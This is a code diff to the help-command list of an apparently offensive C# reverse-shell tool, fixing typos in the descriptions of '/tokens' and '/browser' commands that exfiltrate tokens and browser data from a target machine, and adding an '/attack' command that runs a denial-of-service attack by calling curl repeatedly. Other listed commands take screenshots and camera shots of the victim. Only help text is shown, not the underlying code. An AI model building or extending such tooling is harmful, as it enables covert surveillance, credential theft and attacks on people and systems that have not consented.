@@ -55,14 +55,16 @@ namespace WebSocketReverseShellDotNet.service.commands
                 new HelpCommand("/screenshot", "take screen shot",
             "NA", "/screenshot"),
 
-                new HelpCommand("/tokens", "Exfilterate tokens from target machine",
+                new HelpCommand("/tokens", "Exfiltrate tokens from target machine",
             "NA", "/tokens"),
 
-                new HelpCommand("/browser", "Exfilterate data from browser in the target",
+                new HelpCommand("/browser", "Exfiltrate data from browser in the target",
             "NA", "/browser"),
 
                 new HelpCommand("/camerashot", "take camera shot",
             "NA", "/camerashot"),
+                new HelpCommand("/attack", "start denial of service attack by calling curl every few seconds",
+            "arg1= ['curl' or 'stop']", "'/attack curl <rest of the command>' or '/attack stop'"),
                 new HelpCommand("/exit", "Terminate shell",
             "NA", "/exit"),
              
